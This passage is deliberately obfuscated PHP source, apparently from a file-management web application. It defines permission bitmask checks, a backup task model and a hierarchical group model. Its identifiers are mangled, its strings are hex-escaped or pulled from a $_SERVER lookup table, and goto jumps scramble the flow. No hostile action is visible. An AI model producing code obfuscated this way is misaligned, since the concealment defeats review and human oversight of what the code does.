=> $œ×‰”õ¦[1862], $œ×‰”õ¦[1856] => 3, $œ×‰”õ¦[1857] => 1, $œ×‰”õ¦[1858] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($œ×‰”õ¦[429] => LNG($œ×‰”õ¦[1863]), $œ×‰”õ¦[1854] => $œ×‰”õ¦[1864], $œ×‰”õ¦[1856] => 4, $œ×‰”õ¦[1857] => 1, $œ×‰”õ¦[1858] => self::AUTH_SHOW | self::AUTH_VIEW), array($œ×‰”õ¦[429] => LNG($œ×‰”õ¦[1865]), $œ×‰”õ¦[1854] => $œ×‰”õ¦[1866], $œ×‰”õ¦[1856] => 5, $œ×‰”õ¦[1857] => 1, $œ×‰”õ¦[1858] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($œ×‰”õ¦[429] => LNG($œ×‰”õ¦[1867]), $œ×‰”õ¦[1854] => $œ×‰”õ¦[1868], $œ×‰”õ¦[1856] => 6, $œ×‰”õ¦[1857] => 1, $œ×‰”õ¦[1858] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($œ×‰”õ¦[429] => LNG($œ×‰”õ¦[1869]), $œ×‰”õ¦[1854] => $œ×‰”õ¦[1870], $œ×‰”õ¦[1856] => 7, $œ×‰”õ¦[1857] => 1, $œ×‰”õ¦[1858] => 0)); return $¢Õ¾ş; } public static function authCheck($–¢òı€, $´©Ÿî×¡) { $¶ˆùŠ×² =& $_SERVER[Å¶¨Şêº]; $–¢òı€ = intval($–¢òı€); if ($GLOBALS[$¶ˆùŠ×²[503]] && $GLOBALS[$¶ˆùŠ×²[6]][$¶ˆùŠ×²[1871]]) { return !0; } if ($–¢òı€ <= 0) { return !1; } if (($–¢òı€ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($–¢òı€ & $´©Ÿî×¡); } public static function authCheckShow($ëóª¶Ø€) { return self::authCheck($ëóª¶Ø€, self::AUTH_SHOW); } public static function authCheckView($®©…­ĞŒ) { return self::authCheck($®©…­ĞŒ, self::AUTH_VIEW); } public static function authCheckDownload($›Ñ™œ ¬) { return self::authCheck($›Ñ™œ ¬, self::AUTH_DOWNLOAD); } public static function authCheckUpload($îæÙÌïâ) { return self::authCheck($îæÙÌïâ, self::AUTH_UPLOAD); } public static function authCheckEdit($šï´õ‹¶) { return self::authCheck($šï´õ‹¶, self::AUTH_EDIT); } public static function authCheckRemove($ğ´õºÅº) { return self::authCheck($ğ´õºÅº, self::AUTH_REMOVE); } public static function authCheckShare($ã¾ ›˜¯) { return self::authCheck($ã¾ ›˜¯, self::AUTH_SHARE); } public static function authCheckComment($ï­ûß÷¢) { return self::authCheck($ï­ûß÷¢, self::AUTH_COMMENT); } public static function authCheckEvent($”…ùäÅ†) { return self::authCheck($”…ùäÅ†, self::AUTH_EVENT); } public static function authCheckRoot($Á¯‚ñŞ™) { return self::authCheck($Á¯‚ñŞ™, self::AUTH_ROOT); } public static function authCheckAction($åø…˜ã®, $®ÁÅÒÛá) { $Ğ¢úùù£ =& $_SERVER[Å¶¨Şêº]; $úØäµÑä = array($Ğ¢úùù£[1872] => self::AUTH_VIEW, $Ğ¢úùù£[1192] => self::AUTH_DOWNLOAD, $Ğ¢úùù£[118] => self::AUTH_UPLOAD, $Ğ¢úùù£[1822] => self::AUTH_EDIT, $Ğ¢úùù£[1821] => self::AUTH_REMOVE, $Ğ¢úùù£[1832] => self::AUTH_SHARE, $Ğ¢úùù£[364] => self::AUTH_COMMENT, $Ğ¢úùù£[1651] => self::AUTH_EVENT, $Ğ¢úùù£[1873] => self::AUTH_ROOT); if (!isset($úØäµÑä[$®ÁÅÒÛá])) { return; } $ßÃ›ŒÙ¢ = $úØäµÑä[$®ÁÅÒÛá]; $åø…˜ã® = intval($åø…˜ã®); if ($åø…˜ã® <= 0) { return !1; } if (($åø…˜ã® & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($åø…˜ã® & $ßÃ›ŒÙ¢); } public static function authDisable($Š°Ãüš¦, $”®ôØù) { if (intval($Š°Ãüš¦) <= 0) { return 0; } return intval($Š°Ãüš¦) & ~$”®ôØù; } public $optionType = "\123\171\163\x74\145\x6d\x2e\163\x6f\x75\162\x63\x65\x41\165\x74\150\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\141\x75\164\x68", "\154\141\142\145\x6c", "\x64\x69\163\x70\154\x61\171", "\x73\171\163\x74\145\155", "\x73\x6f\162\x74"); public function initData() { $ŠúÜÌÊ’ = $this->authDefault(); foreach ($ŠúÜÌÊ’ as $Ì°ãÆ¸º) { $this->add($Ì°ãÆ¸º); } } public function findAuth($‰©¸µ , $½ÕÉ——À) { $µ©áë¦Õ =& $_SERVER[Å¶¨Şêº]; $•’’Œâ÷ = parent::listData(); foreach ($•’’Œâ÷ as $±×ú¶ÍÄ) { $ÍİëÍ™× = intval($±×ú¶ÍÄ[$µ©áë¦Õ[422]]); if ($ÍİëÍ™× <= 0 || $±×ú¶ÍÄ[$µ©áë¦Õ[1874]] == 0) { continue; } if (($ÍİëÍ™× & $‰©¸µ ) != $‰©¸µ ) { continue; } if (($ÍİëÍ™× & $½ÕÉ——À) != 0) { continue; } return $±×ú¶ÍÄ[$µ©áë¦Õ[408]]; } return !1; } public function findAuthReadOnly() { $şŒÀ–Ñ‹ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ûƒÛŒöó = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($şŒÀ–Ñ‹, $ûƒÛŒöó); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $›ôÅ¢ÉÇ =& $_SERVER[Å¶¨Şêº]; $¤ø¿»š® = parent::listData(); $¶¢ôøÊ¹ = !1; foreach ($¤ø¿»š® as $Î÷¼ß¤Ô) { if ($Î÷¼ß¤Ô[$›ôÅ¢ÉÇ[422]] <= 0 || $Î÷¼ß¤Ô[$›ôÅ¢ÉÇ[1874]] == $›ôÅ¢ÉÇ[209]) { continue; } if (!$¶¢ôøÊ¹) { $¶¢ôøÊ¹ = $Î÷¼ß¤Ô; continue; } if ($¶¢ôøÊ¹[$›ôÅ¢ÉÇ[422]] > $Î÷¼ß¤Ô[$›ôÅ¢ÉÇ[422]]) { $¶¢ôøÊ¹ = $Î÷¼ß¤Ô; } } return $¶¢ôøÊ¹ ? $¶¢ôøÊ¹[$›ôÅ¢ÉÇ[408]] : $›ôÅ¢ÉÇ[12]; } public function listData($¬–öƒ« = false, $ ·…ŞÄ¿ = "\x73\x6f\162\x74", $›­ËÆ‡ = false) { return parent::listData($¬–öƒ«, $ ·…ŞÄ¿, $›­ËÆ‡); } public function update($şËåœ¹, $¦Êüº¾) { $â¡ëù¦‡ =& $_SERVER[Å¶¨Şêº]; $¾œ¥œÂ‚ = parent::listData($şËåœ¹); $»Çë×¶ğ = $this->findByName($¦Êüº¾[$â¡ëù¦‡[42]]); if (!$¾œ¥œÂ‚ || $»Çë×¶ğ && $»Çë×¶ğ[$â¡ëù¦‡[408]] != $¾œ¥œÂ‚[$â¡ëù¦‡[408]]) { return !1; } $this->filterAuth($¦Êüº¾[$â¡ëù¦‡[422]]); return parent::update($şËåœ¹, $¦Êüº¾); } public function remove($¬Ò‡å£) { $ŠàÁç‡Ä = parent::listData($¬Ò‡å£); if (!$ŠàÁç‡Ä || $ŠàÁç‡Ä[$_SERVER[Å¶¨Şêº][1282]]) { return !1; } return parent::remove($¬Ò‡å£); } public function add($ĞÈèëõÔ = array()) { $ÛĞªì·Ï =& $_SERVER[Å¶¨Şêº]; if ($this->findByName($ĞÈèëõÔ[$ÛĞªì·Ï[42]])) { return !1; } $Ô×Éøú = array($ÛĞªì·Ï[42] => $ÛĞªì·Ï[12], $ÛĞªì·Ï[422] => 1, $ÛĞªì·Ï[1875] => $ÛĞªì·Ï[1862], $ÛĞªì·Ï[1874] => 1, $ÛĞªì·Ï[1282] => 0, $ÛĞªì·Ï[1876] => 0); $ĞÈèëõÔ = array_merge($Ô×Éøú, $ĞÈèëõÔ); $ĞÈèëõÔ[$ÛĞªì·Ï[1876]] = $this->getSort(); $this->filterAuth($ĞÈèëõÔ[$ÛĞªì·Ï[422]]); return parent::insert($ĞÈèëõÔ); } private function getSort() { $¼¡Ö‡æÈ =& $_SERVER[Å¶¨Şêº]; $²ÉÛËÅª = parent::listData(); $äŒÌ…ÒÜ = array_to_keyvalue($²ÉÛËÅª, $¼¡Ö‡æÈ[12], $¼¡Ö‡æÈ[1876]); return empty($äŒÌ…ÒÜ) ? 0 : max($äŒÌ…ÒÜ) + 1; } private function filterAuth(&$¨¥—û€) { if (!$¨¥—û€) { return; } $‚«îî³ˆ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Êœ¥Ú™± = array(); foreach ($‚«îî³ˆ as $Ãïó„¬ô) { if ($¨¥—û€ & $Ãïó„¬ô) { $Êœ¥Ú™±[] = $Ãïó„¬ô; } } if (in_array(self::AUTH_ROOT, $Êœ¥Ú™±)) { $¨¥—û€ = array_sum($‚«îî³ˆ); return; } $—·şºÜÏ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Êœ¥Ú™± as $Ãïó„¬ô) { if (isset($—·şºÜÏ[$Ãïó„¬ô])) { $Êœ¥Ú™± = array_merge($Êœ¥Ú™±, $—·şºÜÏ[$Ãïó„¬ô]); } } $Êœ¥Ú™±[] = self::AUTH_SHOW; $¨¥—û€ = array_sum(array_unique($Êœ¥Ú™±)); } public function sort($Ÿ‚¨Í¾É, $£¼›Éó) { return parent::update($Ÿ‚¨Í¾É, $£¼›Éó); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\142\x61\143\x6b\x75\160\x4c\151\x73\x74"; public $field = array("\x69\x6f", "\156\141\155\145", "\163\x74\x61\164\x75\x73", "\143\157\x6e\164\x65\156\x74", "\155\x61\x6e\x75\x61\x6c", "\x72\x65\x73\x75\154\x74", "\164\x69\155\x65\106\162\157\155", "\x74\151\x6d\145\x54\x6f"); public function config() { $ÕŒĞ—Ä® =& $_SERVER[Å¶¨Şêº]; $§‘¡ŞÂ = Model($ÕŒĞ—Ä®[768])->get($ÕŒĞ—Ä®[778]); $§‘¡ŞÂ = json_decode($§‘¡ŞÂ, !0); $§‘¡ŞÂ = is_array($§‘¡ŞÂ) ? $§‘¡ŞÂ : array(); if (!isset($§‘¡ŞÂ[$ÕŒĞ—Ä®[752]])) { $§‘¡ŞÂ[$ÕŒĞ—Ä®[752]] = $ÕŒĞ—Ä®[99]; } unset($§‘¡ŞÂ[$ÕŒĞ—Ä®[1633]]); Action($ÕŒĞ—Ä®[1877])->taskInit(); Model($ÕŒĞ—Ä®[1632])->cacheClear(); $Ïğ›ğÔñ = $ÕŒĞ—Ä®[1878]; $¨Ëœãö¯ = Model($ÕŒĞ—Ä®[1879])->findByKey($ÕŒĞ—Ä®[1651], $Ïğ›ğÔñ); if (!$¨Ëœãö¯) { $¨Ëœãö¯ = array(); } if (isset($¨Ëœãö¯[$ÕŒĞ—Ä®[191]])) { $¨Ëœãö¯[$ÕŒĞ—Ä®[191]] = json_decode($¨Ëœãö¯[$ÕŒĞ—Ä®[191]], !0); } if (isset($§‘¡ŞÂ[$ÕŒĞ—Ä®[191]])) { $¨Ëœãö¯[$ÕŒĞ—Ä®[191]][$ÕŒĞ—Ä®[1636]] = $§‘¡ŞÂ[$ÕŒĞ—Ä®[191]]; unset($§‘¡ŞÂ[$ÕŒĞ—Ä®[191]]); } return array_merge($¨Ëœãö¯, $§‘¡ŞÂ); } public function listData($°¥äÃòà = false, $¢ôÃŞ ë = "\x6d\x6f\x64\x69\146\171\x54\x69\155\x65", $¶¯Ö«êö = false) { return parent::listData($°¥äÃòà, $¢ôÃŞ ë, !0); } public function lastItem() { $‚ÙŠ‹Ñ = $this->listData(); return !empty($‚ÙŠ‹Ñ[0]) ? $‚ÙŠ‹Ñ[0] : null; } public function kill($ü¡’é‚) { $ÙÏ¿ßÃü =& $_SERVER[Å¶¨Şêº]; $­“œ¶Ï÷ = $this->listData($ü¡’é‚); if (!$­“œ¶Ï÷ || empty($­“œ¶Ï÷[$ÙÏ¿ßÃü[42]])) { return !0; } Task::kill($ÙÏ¿ßÃü[777]); Task::kill($ÙÏ¿ßÃü[798]); Task::kill($ÙÏ¿ßÃü[807]); $ñúÕÌçÛ = $­“œ¶Ï÷[$ÙÏ¿ßÃü[42]]; $‡¤…—šÑ = TEMP_FILES . $ÙÏ¿ßÃü[776] . $ñúÕÌçÛ . $ÙÏ¿ßÃü[8]; IO::remove($‡¤…—šÑ, !1); return $this->remove($ü¡’é‚); } public function remove($ÈµòÄ”ô) { $æÙ³ô÷¾ = $this->listData($ÈµòÄ”ô); if (!$æÙ³ô÷¾) { return !0; } return $this->backupRemove($æÙ³ô÷¾); } private function backupRemove($ªÒõÒÍ‹) { parent::remove($ªÒõÒÍ‹[$_SERVER[Å¶¨Şêº][408]]); $´Áüªæ´ = $this->backupPath($ªÒõÒÍ‹); IO::remove($´Áüªæ´, !1); return !0; } private function backupPath($²×˜½ëä) { $‹˜Ö³Ø =& $_SERVER[Å¶¨Şêº]; $—òö«Çò = $²×˜½ëä[$‹˜Ö³Ø[42]]; $ÏÙù“ŞÂ = Model($‹˜Ö³Ø[768])->get($‹˜Ö³Ø[769]); $ÄˆÀùãø = substr(md5($‹˜Ö³Ø[770] . $ÏÙù“ŞÂ . $—òö«Çò), 0, 8); return "\173\151\157\72{$²×˜½ëä[$‹˜Ö³Ø[749]]}\175\x2f\144\141\164\x61\x62\141\x73\145\x2f\x62\141\143\x6b\x75\x70\57" . $—òö«Çò . $‹˜Ö³Ø[11] . $ÄˆÀùãø; } public function start() { $½¾à İï =& $_SERVER[Å¶¨Şêº]; if ($GLOBALS[$½¾à İï[6]][$½¾à İï[100]][$½¾à İï[1880]] != $½¾à İï[99]) { return !0; } $ğ—€¯‘± = $this->config(); if (!$ğ—€¯‘± || $ğ—€¯‘±[$½¾à İï[1633]] != $½¾à İï[99]) { return !1; } $¬É÷ê = $this->process(); foreach ($¬É÷ê as $ÜÎî‹š) { if ($ÜÎî‹š) { return Task::restart($ÜÎî‹š[$½¾à İï[408]]); } } $£ØüÎğ“ = new Backup(); $¤´¾Ù©Ş = $£ØüÎğ“->db(); if ($¤´¾Ù©Ş) { $¤´¾Ù©Ş = $£ØüÎğ“->dbFile(); if ($¤´¾Ù©Ş && $ğ—€¯‘±[$½¾à İï[752]] == $½¾à İï[209]) { $¤´¾Ù©Ş = $£ØüÎğ“->file(); } } Backup::set(array($½¾à İï[747] => 1, $½¾à İï[759] => time())); return !0; } public function process() { $²ÌÇ¶é³ =& $_SERVER[Å¶¨Şêº]; $î¯²æÍ = array($²ÌÇ¶é³[755] => Task::get($²ÌÇ¶é³[777]), $²ÌÇ¶é³[760] => Task::get($²ÌÇ¶é³[798]), $²ÌÇ¶é³[211] => Task::get($²ÌÇ¶é³[807])); $¬‘Ñµì´ = !1; foreach ($î¯²æÍ as &$³ø›§Úİ) { if ($¬‘Ñµì´) { $³ø›§Úİ = !1; continue; } if ($³ø›§Úİ) { $´Æƒ˜æ = intval(_get($³ø›§Úİ, $²ÌÇ¶é³[1668], 0)); if (time() - $´Æƒ˜æ > 7200) { Task::kill($³ø›§Úİ[$²ÌÇ¶é³[408]]); $¬‘Ñµì´ = !0; $³ø›§Úİ = !1; } } } return $î¯²æÍ; } public function restore() { $öµ×âÏ =& $_SERVER[Å¶¨Şêº]; ActionCall($öµ×âÏ[1057], !0, 1); ActionCall($öµ×âÏ[1057], !0, 0); } } goto E·§ŒÓ­±¨; C•Æ—¡åÜñ: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\x70"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\x6d\145" => "\x67\x72\x6f\x75\160\x5f\155\x65\164\141", "\x6d\x65\x74\141\106\x69\x65\154\144" => "\147\x72\x6f\x75\x70\x49\x44"); protected function cacheFunctionAlias($½í”ÂÒ) { $Ë¢˜ù¥ =& $_SERVER[Å¶¨Şêº]; return array($Ë¢˜ù¥[1930] => array($½í”ÂÒ[0], $Ë¢˜ù¥[1931]), $Ë¢˜ù¥[1932] => array($½í”ÂÒ[0], $Ë¢˜ù¥[1933])); } protected function getInfo($‹î±Ûãâ, $§Éë±Ñ· = false) { $·Úìü‡§ = $this->getInfoSimple($‹î±Ûãâ); if (!$·Úìü‡§) { return !1; } if ($§Éë±Ñ·) { return $this->_listDataApplyItem($·Úìü‡§); } return $this->cacheFunctionGet($_SERVER[Å¶¨Şêº][1934], $‹î±Ûãâ); } protected function getInfoSimple($·ªÌ˜Ü÷, $õøºÔÇ¾ = false) { $ñåÛ”«¿ =& $_SERVER[Å¶¨Şêº]; if ($õøºÔÇ¾) { $‡›”ŸìÄ = array($ñåÛ”«¿[1852] => intval($·ªÌ˜Ü÷)); $ı¸°Èµ = $this->where($‡›”ŸìÄ)->find(); return is_array($ı¸°Èµ) ? $ı¸°Èµ : array(); } return $this->cacheFunctionGet($ñåÛ”«¿[1935], $·ªÌ˜Ü÷); } protected function groupAdd($Ê˜‰˜‡) { $È„ŒÉ† =& $_SERVER[Å¶¨Şêº]; if (!$Ê˜‰˜‡[$È„ŒÉ†[441]] && isset($Ê˜‰˜‡[$È„ŒÉ†[1852]]) && $Ê˜‰˜‡[$È„ŒÉ†[1852]] == 1) { if ($¢ıÙÌ¥ = $this->getInfoSimple($Ê˜‰˜‡[$È„ŒÉ†[1852]], !0)) { return $Ê˜‰˜‡[$È„ŒÉ†[1852]]; } } else { $¢ıÙÌ¥ = $this->getInfoSimple($Ê˜‰˜‡[$È„ŒÉ†[441]]); if (!$¢ıÙÌ¥) { return !1; } } $şµ¸×¡ş = $È„ŒÉ†[530]; if ($¢ıÙÌ¥[$È„ŒÉ†[520]]) { $şµ¸×¡ş = $¢ıÙÌ¥[$È„ŒÉ†[520]] . $¢ıÙÌ¥[$È„ŒÉ†[1852]] . $È„ŒÉ†[60]; } $ã—ôá¥è = array($È„ŒÉ†[429] => $this->groupNameAuto($Ê˜‰˜‡[$È„ŒÉ†[441]], $Ê˜‰˜‡[$È„ŒÉ†[42]]), $È„ŒÉ†[410] => $Ê˜‰˜‡[$È„ŒÉ†[441]], $È„ŒÉ†[589] => $şµ¸×¡ş, $È„ŒÉ†[1936] => $Ê˜‰˜‡[$È„ŒÉ†[1839]], $È„ŒÉ†[1937] => 0, $È„ŒÉ†[1856] => 0); if (isset($Ê˜‰˜‡[$È„ŒÉ†[1876]])) { $ã—ôá¥è[$È„ŒÉ†[1876]] = $Ê˜‰˜‡[$È„ŒÉ†[1876]]; } else { $…å¤Ùå‚ = $this->max($È„ŒÉ†[1876]); if (!$…å¤Ùå‚) { $…å¤Ùå‚ = 0; } $ã—ôá¥è[$È„ŒÉ†[1876]] = $…å¤Ùå‚ + 1; } if (!empty($Ê˜‰˜‡[$È„ŒÉ†[1852]])) { $ã—ôá¥è[$È„ŒÉ†[1852]] = $Ê˜‰˜‡[$È„ŒÉ†[1852]]; } $ÅñÈôÙš = $this->add($ã—ôá¥è); $this->setNamePinyin($ÅñÈôÙš, $ã—ôá¥è[$È„ŒÉ†[42]]); if (isset($Ê˜‰˜‡[$È„ŒÉ†[1938]])) { $this->metaSet($ÅñÈôÙš, array($È„ŒÉ†[1938] => $Ê˜‰˜‡[$È„ŒÉ†[1938]], $È„ŒÉ†[1939] => $Ê˜‰˜‡[$È„ŒÉ†[1939]])); unset($Ê˜‰˜‡[$È„ŒÉ†[1938]]); unset($Ê˜‰˜‡[$È„ŒÉ†[1939]]); } Model($È„ŒÉ†[1337])->groupRootAdd($ÅñÈôÙš); return $ÅñÈôÙš; } protected function groupEdit($³İ­èÃ®, $ú—­«äú) { $º¦Ï–Ê½ =& $_SERVER[Å¶¨Şêº]; $†¢ùâ®Ê = $this->getInfoSimple($³İ­èÃ®); if (!$†¢ùâ®Ê) { return !1; } if (!empty($ú—­«äú[$º¦Ï–Ê½[441]])) { $´¼¸Î«Ü = $this->getInfoSimple($ú—­«äú[$º¦Ï–Ê½[441]]); if (!$´¼¸Î«Ü) { return !1; } if ($†¢ùâ®Ê[$º¦Ï–Ê½[1852]] == $´¼¸Î«Ü[$º¦Ï–Ê½[1852]]) { return !1; } if ($ú—­«äú[$º¦Ï–Ê½[441]] != $†¢ùâ®Ê[$º¦Ï–Ê½[441]]) { if ($´¼¸Î«Ü[$º¦Ï–Ê½[520]] !== $†¢ùâ®Ê[$º¦Ï–Ê½[520]] && strpos($´¼¸Î«Ü[$º¦Ï–Ê½[520]], $†¢ùâ®Ê[$º¦Ï–Ê½[520]] . $†¢ùâ®Ê[$º¦Ï–Ê½[1852]] . $º¦Ï–Ê½[60]) === 0) { return !1; } $ú—­«äú[$º¦Ï–Ê½[589]] = $´¼¸Î«Ü[$º¦Ï–Ê½[520]] . $ú—­«äú[$º¦Ï–Ê½[441]] . $º¦Ï–Ê½[60]; $this->_changeChildLevel($†¢ùâ®Ê, $´¼¸Î«Ü); } } if (isset($ú—­«äú[$º¦Ï–Ê½[42]])) { $this->setNamePinyin($³İ­èÃ®, $ú—­«äú[$º¦Ï–Ê½[42]]); } if (isset($ú—­«äú[$º¦Ï–Ê½[1938]])) { $this->metaSet($³İ­èÃ®, array($º¦Ï–Ê½[1938] => $ú—­«äú[$º¦Ï–Ê½[1938]], $º¦Ï–Ê½[1939] => $ú—­«äú[$º¦Ï–Ê½[1939]])); unset($ú—­«äú[$º¦Ï–Ê½[1938]]); unset($ú—­«äú[$º¦Ï–Ê½[1939]]); } $this->_clearChildrenCache($†¢ùâ®Ê); return $this->where(array($º¦Ï–Ê½[1940] => $³İ­èÃ®))->save($ú—­«äú); } private function _clearChildrenCache($ı¾œŒÇÈ) { $ÚóÂµô¢ =& $_SERVER[Å¶¨Şêº]; $»ïïıÕ‘ = array($ÚóÂµô¢[589] => array($ÚóÂµô¢[549], $ı¾œŒÇÈ[$ÚóÂµô¢[520]] . $ı¾œŒÇÈ[$ÚóÂµô¢[1852]] . $ÚóÂµô¢[550])); $íØ¤ÕÖ = $this->field($ÚóÂµô¢[1852])->where($»ïïıÕ‘)->select(); foreach ($íØ¤ÕÖ as $Äáº³Êè) { $this->_clearCache($Äáº³Êè[$ÚóÂµô¢[1852]]); } } private function _clearCache($«Óƒ¶ç¢) { $ µæŒôá =& $_SERVER[Å¶¨Şêº]; $this->cacheFunctionClear($ µæŒôá[1934], $«Óƒ¶ç¢); $this->cacheFunctionClear($ µæŒôá[1935], $«Óƒ¶ç¢); } private function _changeChildLevel($­Ò‹í½², $§¼Ô±‘Å, $­ğÅäÜÅ = false) { $×¡úÇ·Ò =& $_SERVER[Å¶¨Şêº]; $ÇğŞÑ÷İ = $­Ò‹í½²[$×¡úÇ·Ò[520]] . $­Ò‹í½²[$×¡úÇ·Ò[1852]] . $×¡úÇ·Ò[60]; $ŒêÌ…ŞÒ = $§¼Ô±‘Å[$×¡úÇ·Ò[520]] . $§¼Ô±‘Å[$×¡úÇ·Ò[1852]] . $×¡úÇ·Ò[60] . $­Ò‹í½²[$×¡úÇ·Ò[1852]] . $×¡úÇ·Ò[60]; if ($­ğÅäÜÅ) { $ŒêÌ…ŞÒ = $§¼Ô±‘Å[$×¡úÇ·Ò[520]] . $§¼Ô±‘Å[$×¡úÇ·Ò[1852]] . $×¡úÇ·Ò[60]; } $‘¸‚æÓ‘ = array($×¡úÇ·Ò[589] => array($×¡úÇ·Ò[549], $­Ò‹í½²[$×¡úÇ·Ò[520]] . $­Ò‹í½²[$×¡úÇ·Ò[1852]] . $×¡úÇ·Ò[550])); $ğ¢ù¿÷Ö = array($×¡úÇ·Ò[589] => array($×¡úÇ·Ò[598], "\162\x65\160\154\141\143\x65\50\160\141\162\x65\x6e\x74\x4c\x65\166\145\x6c\x2c\47{$ÇğŞÑ÷İ}\x27\x2c\x27{$ŒêÌ…ŞÒ}\47\51")); $this->_clearChildrenCache($­Ò‹í½²); $this->where($‘¸‚æÓ‘)->data($ğ¢ù¿÷Ö)->save(); } public function setNamePinyin($»Èı„ôì, $§³²ì‹ø = false) { $ƒŒš—Ä =& $_SERVER[Å¶¨Şêº]; if (!$§³²ì‹ø) { $şÌ§â¿É = $this->getInfoSimple($»Èı„ôì); $§³²ì‹ø = $şÌ§â¿É[$ƒŒš—Ä[42]]; } if (!Input::check($§³²ì‹ø, $ƒŒš—Ä[592])) { $this->metaSet($»Èı„ôì, $ƒŒš—Ä[474], null); $this->metaSet($»Èı„ôì, $ƒŒš—Ä[473], null); return; } $´ƒ¿÷äí = array($ƒŒš—Ä[474] => str_replace($ƒŒš—Ä[63], $ƒŒš—Ä[12], Pinyin::get($§³²ì‹ø)), $ƒŒš—Ä[473] => Pinyin::get($§³²ì‹ø, $ƒŒš—Ä[593])); $this->metaSet($»Èı„ôì, $´ƒ¿÷äí); } protected function groupStatus($±¨ÔéÍî, $¼ª³—‡) { $í´¡ÂÂ® =& $_SERVER[Å¶¨Şêº]; $–äã¥§õ = $this->getInfoSimple($±¨ÔéÍî); if (!$–äã¥§õ) { return !1; } if ($¼ª³—‡ == $í´¡ÂÂ®[99]) { $ØØŸÆ÷ä = $this->parentLevelArray($–äã¥§õ[$í´¡ÂÂ®[520]]); } else { $…Ïäç°¡ = array($í´¡ÂÂ®[589] => array($í´¡ÂÂ®[549], $–äã¥§õ[$í´¡ÂÂ®[520]] . $–äã¥§õ[$í´¡ÂÂ®[1852]] . $í´¡ÂÂ®[550])); $ØØŸÆ÷ä = $this->where($…Ïäç°¡)->field($í´¡ÂÂ®[1852])->select(); $ØØŸÆ÷ä = array_to_keyvalue($ØØŸÆ÷ä, $í´¡ÂÂ®[12], $í´¡ÂÂ®[1852]); } $ØØŸÆ÷ä[] = $–äã¥§õ[$í´¡ÂÂ®[1852]]; $Ô³ãĞêÚ = array(); foreach ($ØØŸÆ÷ä as $±¨ÔéÍî) { $Ô³ãĞêÚ[] = array($í´¡ÂÂ®[1852] => $±¨ÔéÍî, $í´¡ÂÂ®[105] => $í´¡ÂÂ®[747], $í´¡ÂÂ®[384] => $¼ª³—‡); $this->_clearCache($±¨ÔéÍî); } return Model($í´¡ÂÂ®[1941])->addAll($Ô³ãĞêÚ, array(), !0); } protected function groupRemove($ñÙÈÊ¨, $—Ç•æ´‘ = false) { $ÄØóÕÙç =& $_SERVER[Å¶¨Şêº]; $£˜äÄ„ = array($ÄØóÕÙç[1852] => $ñÙÈÊ¨); $á¼™š§Ö = $this->where($£˜äÄ„)->find(); if (!$á¼™š§Ö || $á¼™š§Ö[$ÄØóÕÙç[441]] == 0) { return !1; } if (!$—Ç•æ´‘) { $¨˜ªùÚ“ = $this->getInfoSimple($á¼™š§Ö[$ÄØóÕÙç[441]]); $this->_changeChildLevel($á¼™š§Ö, $¨˜ªùÚ“, !0); $this->where(array($ÄØóÕÙç[441] => $ñÙÈÊ¨))->save(array($ÄØóÕÙç[441] => $á¼™š§Ö[$ÄØóÕÙç[441]])); } Model($ÄØóÕÙç[1941])->where($£˜äÄ„)->delete(); Model($ÄØóÕÙç[1942])->where($£˜äÄ„)->delete(); Model($ÄØóÕÙç[823])->groupRootRemove($ñÙÈÊ¨); return $this->where($£˜äÄ„)->delete(); } protected function groupSort($ç£‘¥»Ï) { $Õ¬ƒáŞ± =& $_SERVER[Å¶¨Şêº]; $««Ø¯œŒ = array(); foreach ($ç£‘¥»Ï as $Ä´ÛÑÜæ => $¢—·‘¿) { $««Ø¯œŒ[] = array($Õ¬ƒáŞ±[1852], $¢—·‘¿, $Õ¬ƒáŞ±[1876], $Ä´ÛÑÜæ + 1); } $this->saveAll($««Ø¯œŒ); } public function listData() { $ÕÏ–ç’ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÕÏ–ç’[$_SERVER[Å¶¨Şêº][379]]); return $ÕÏ–ç’; } private function _makeOrder($Ãç®¯ = '') { $ıìÛ›ôª =& $_SERVER[Å¶¨Şêº]; $•ŠÓ§€ô = array($ıìÛ›ôª[1852], $ıìÛ›ôª[42], $ıìÛ›ôª[1841], $ıìÛ›ôª[212]); $…½§Ôı = array($ıìÛ›ôª[459] => $ıìÛ›ôª[460], $ıìÛ›ôª[461] => $ıìÛ›ôª[462]); $ÄåÉšÃ• = Input::get($ıìÛ›ôª[466], $ıìÛ›ôª[7], $ıìÛ›ôª[1856], $•ŠÓ§€ô); $©şÓ™·â = Input::get($ıìÛ›ôª[467], $ıìÛ›ôª[7], $ıìÛ›ôª[1943], array($ıìÛ›ôª[1943], $ıìÛ›ôª[461])); $©şÓ™·â = $…½§Ôı[$©şÓ™·â]; $Ãç®¯ = $Ãç®¯ . "{$ÄåÉšÃ•}\40{$©şÓ™·â}\x2c\x20\147\x72\x6f\x75\160\111\x44\40\x61\x73\143"; return $this->order($Ãç®¯); } public function listChild($‚·…áõĞ) { $şèóĞ»Ô =& $_SERVER[Å¶¨Şêº]; $í´ûÄ‰œ 